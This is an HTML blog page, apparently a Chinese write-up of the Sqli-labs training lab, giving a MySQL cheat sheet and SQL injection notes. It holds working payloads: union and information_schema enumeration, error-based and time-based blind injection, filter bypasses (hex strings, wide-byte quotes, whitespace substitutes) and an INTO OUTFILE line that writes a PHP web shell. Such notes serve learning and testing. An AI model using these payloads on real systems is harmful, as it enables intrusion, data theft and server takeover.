@@ -1,0 +1,1462 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="wywwzjj">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="wywwzjj">
+    
+    <meta name="keywords" content="wywwzjj,wywwzjj-ctf,wywwzjj-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Sqli-labs 通关笔记 · wywwzjj&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/B.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">wywwzjj&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Sqli-labs 通关笔记</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">wywwzjj's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Sqli-labs 通关笔记
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Writeup">Writeup</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="SQLi">SQLi</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.7k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/01/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p><img src="https://qqadapt.qpic.cn/txdocpic/0/8f76487a3fe36749dfd454f8ac4d8c78/0" alt="img"></p>
+<ul>
+<li><p>基于从服务器接收到的响应</p>
+<ul>
+<li>基于错误的SQL注入</li>
+<li>联合查询的类型</li>
+<li>堆查询注入</li>
+<li>SQL盲注<ul>
+<li>基于布尔SQL盲注</li>
+<li>基于时间的SQL盲注</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>基于如何处理输入的SQL查询（数据类型）</p>
+<ul>
+<li>基于字符串</li>
+<li>数字或整数为基础的</li>
+</ul>
+</li>
+<li><p>基于程度和顺序的注入(哪里发生了影响)</p>
+<ul>
+<li><p>一次注入</p>
+<p>输入的注入语句对WEB直接产生了影响，出现了结果</p>
+</li>
+<li><p>二次注入</p>
+<p>类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，</p>
+<p>通过其它的辅助间接的对WEB产生危害，这样的就被称为是二次注入</p>
+</li>
+</ul>
+</li>
+<li><p>基于注入点的位置上的</p>
+<ul>
+<li>通过用户输入的表单域的注入</li>
+<li>通过cookie注入</li>
+<li>通过服务器变量注入（基于头部信息的注入）</li>
+</ul>
+</li>
+</ul>
+<h3 id="MySQL-常用语句备忘"><a href="#MySQL-常用语句备忘" class="headerlink" title="MySQL 常用语句备忘"></a>MySQL 常用语句备忘</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Default Databases</span></span><br><span class="line">mysql					Requires root privileges</span><br><span class="line">information_schema		Available from version 5 and higher</span><br><span class="line"></span><br><span class="line"><span class="keyword">Comment</span> <span class="keyword">Out</span> <span class="keyword">Query</span></span><br><span class="line"><span class="comment"># /**/ -- - ;%00 `</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();							<span class="comment">-- 数据库用户名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();						<span class="comment">-- MySQL版本</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>();						<span class="comment">-- 数据库名</span></span><br><span class="line"><span class="keyword">select</span> @@basedir;						<span class="comment">-- 数据库安装路径</span></span><br><span class="line"><span class="keyword">select</span> @@datadir;						<span class="comment">-- 数据存储路径</span></span><br><span class="line"><span class="keyword">select</span> @@version_compile_os;		    <span class="comment">-- 操作系统版本</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;	<span class="comment">-- </span></span><br><span class="line">if(expr,v1,v2)							<span class="comment">-- expr正确则v1，否则v2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> expr <span class="keyword">then</span> v1 <span class="keyword">else</span> v2 <span class="keyword">end</span>;  <span class="comment">-- 与 if 功能相同</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">'11'</span>, <span class="string">'22'</span>, <span class="string">'33'</span>);		<span class="comment">-- 字符串连接 112233</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(x, s1,s2...sn)			<span class="comment">-- 以 x 作为连接符，将字符串连接</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>()							<span class="comment">-- 把查询出来的多行连接起来</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">str</span>, <span class="keyword">start</span>, <span class="keyword">count</span>)			<span class="comment">-- 从start开始截取count个字符</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(), <span class="number">1</span>, <span class="number">1</span>)			<span class="comment">-- 与mid同</span></span><br><span class="line"><span class="comment"># 如果用不了逗号，直接 from start for count</span></span><br><span class="line"><span class="comment"># union select * from (select 1)a join (select 2)b == union select 1,2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">str</span>, <span class="keyword">count</span>)					<span class="comment">-- 截取左边count个字符</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ord</span>()							<span class="comment">-- 返回第一个字符的ASCII码</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>()							<span class="comment">-- 与ord同</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">char</span>(<span class="number">32</span>, <span class="number">58</span>, <span class="number">32</span>)					<span class="comment">-- ' : ' 即空格+ : +空格</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>());</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;		<span class="comment">-- 不加限制条件将删除整张表</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> ds_name;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">column</span> column_name;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name;</span><br><span class="line"><span class="keyword">update</span> table_name <span class="keyword">set</span> column_name=<span class="string">'new'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;  <span class="comment">-- 更新</span></span><br><span class="line"><span class="comment">/*!50000select*/</span></span><br><span class="line">where id = 0.1 union <span class="keyword">select</span> ...</span><br><span class="line"><span class="keyword">xor</span>, ||, &amp;&amp;, !, <span class="keyword">not</span>，&lt;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><h5 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h5><p>所查询的字段数需与主查询一致</p>
+<p>字段数可先用 order by x 来确定</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h5 id="information-schema-注入"><a href="#information-schema-注入" class="headerlink" title="information_schema 注入"></a>information_schema 注入</h5><p>存储数据库信息的数据库</p>
+<blockquote>
+<p><strong>数据库名</strong></p>
+<p>schemata =&gt; schema_name</p>
+<p>tables =&gt; table_schema</p>
+<p>columns =&gt; table_schema</p>
+<p><strong>表名</strong></p>
+<p>tables =&gt; table_name</p>
+<p>columns =&gt; table_name</p>
+<p><strong>列名</strong></p>
+<p>columns =&gt; columns_name</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x7365637265745f666c6167</span>; <span class="comment">-- 获得所有列名（字段），table_name 参数进行十六进制编码后可绕过引号被过滤</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#  -- 获取表中的字段名</span></span><br></pre></td></tr></table></figure>
+<h5 id="函数报错信息注入"><a href="#函数报错信息注入" class="headerlink" title="函数报错信息注入"></a>函数报错信息注入</h5><blockquote>
+<p> 前提：后台没有屏蔽数据库报错信息，在语法发生错误时会输出到前端</p>
+</blockquote>
+<p>常用报错函数：updatexml(), extractvalue(), floor() <a href="https://blog.csdn.net/whatday/article/details/63683187" target="_blank" rel="noopener">十种MySQL报错注入</a>  <a href="http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">【SQL注入】报错注入姿势总结</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));%23</span><br><span class="line">and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);%23</span><br></pre></td></tr></table></figure>
+<p>基于函数报错信息获取（select, insert, update, delete)</p>
+<h5 id="insert-update-delete-注入"><a href="#insert-update-delete-注入" class="headerlink" title="insert / update / delete 注入"></a>insert / update / delete 注入</h5><p>结合函数报错信息，将函数插入到语句中</p>
+<h5 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h5><p>如 <code>XFF</code>，<code>referer</code></p>
+<p>观察点：后台收集了请求头中的信息，并存入到数据库中</p>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>结合 and 进行逻辑判断</p>
+<p>效率太低，写脚本爆</p>
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>无显示回显，可在以前的基础上加入 <code>sleep()</code> 语句，若明显延迟，则注入成功</p>
+<p><code>BENCHMARK(count,expr)</code>  执行 <code>count</code> 次的 <code>expr</code>，如 BENCHMARK(10000000,SHA(‘1’))</p>
+<p>即使 <code>sleep</code> 和 <code>benchmark</code> 都被过滤了，但是我们依然可以通过让Mysql进行复杂运算，</p>
+<p>以达到延时的效果，比如可以用字段比较多的表来计算笛卡尔积</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) </span><br><span class="line"><span class="keyword">from</span> information_schema.columns A, </span><br><span class="line">information_schema.columns B, </span><br><span class="line">information_schema.columns C<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>还有 <code>get_lock()</code></p>
+<h5 id="利用注入写入后门"><a href="#利用注入写入后门" class="headerlink" title="利用注入写入后门"></a>利用注入写入后门</h5><p>前提：开启 secure_file_priv，并且具有写的权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php system($_GET[1])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'H:\\a.php'</span><span class="comment">--%20</span></span><br></pre></td></tr></table></figure>
+<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>检测被过滤的关键词：</p>
+<ul>
+<li><p>fuzz 一波 ASCII 码</p>
+</li>
+<li><p>id = 1 ^ (length(‘xxx’)=3)</p>
+</li>
+</ul>
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><ul>
+<li><p>使用注释绕过，/*<em>/ (/\</em>1*/)</p>
+</li>
+<li><p>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 ( ) 包围</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))</span><br><span class="line"><span class="keyword">from</span>(information_schema.tables)</span><br><span class="line"><span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用符号替代空格 </li>
+</ul>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">20</span> 	空格</span><br><span class="line">%<span class="number">09</span>		TAB 键（水平）</span><br><span class="line">%<span class="number">0</span>b		TAB 键（垂直）</span><br><span class="line">%<span class="number">0</span>d		return 功能</span><br><span class="line">%<span class="number">0</span>c		新的一页</span><br><span class="line">%a0		空格</span><br><span class="line">%<span class="number">0</span>a		新建一行</span><br><span class="line"></span><br><span class="line">SQLite3 <span class="number">0</span>A <span class="number">0</span>D <span class="number">0</span>C <span class="number">09</span> <span class="number">20</span> </span><br><span class="line">MySQL5 <span class="number">09</span> <span class="number">0</span>A <span class="number">0</span>B <span class="number">0</span>C <span class="number">0</span>D A0 <span class="number">20</span> </span><br><span class="line">PosgresSQL <span class="number">0</span>A <span class="number">0</span>D <span class="number">0</span>C <span class="number">09</span> <span class="number">20</span> </span><br><span class="line">Oracle <span class="number">11</span>g <span class="number">00</span> <span class="number">0</span>A <span class="number">0</span>D <span class="number">0</span>C <span class="number">09</span> <span class="number">20</span> </span><br><span class="line">MSSQL <span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="number">0</span>F,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br></pre></td></tr></table></figure>
+<h4 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=<span class="string">"users"</span></span><br></pre></td></tr></table></figure>
+<p>如果引号被过滤了，那么上面的<code>where</code>子句就失效了，此时可以使用<strong>十六进制</strong>。<br><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=<span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure>
+<p><strong>宽字节绕过</strong></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span>bf<span class="meta">%</span><span class="number">27</span> <span class="meta">%</span>df<span class="meta">%</span><span class="number">27</span> <span class="meta">%</span>aa<span class="meta">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure>
+<h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><p><code>substr(), mid()</code> 里的逗号可用 <code>from for</code> 代替</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>对于 <code>limit</code> 里面的逗号可以使用 <code>offset</code> 绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>  </span><br><span class="line">&lt;=&gt;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
